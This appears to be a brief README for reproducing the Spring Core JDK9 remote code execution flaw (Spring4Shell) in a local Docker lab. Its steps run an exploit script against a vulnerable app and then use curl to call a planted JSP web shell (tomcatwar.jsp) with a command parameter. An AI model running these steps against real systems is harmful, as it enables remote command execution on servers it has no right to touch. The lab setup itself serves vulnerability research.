# How to reproduce
./mvnw clean package

docker-compose up --build

python3 exp.py --url http://localhost:8080/springshell/greeting

curl --output - "http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=id"

https://www.praetorian.com/blog/spring-core-jdk9-rce/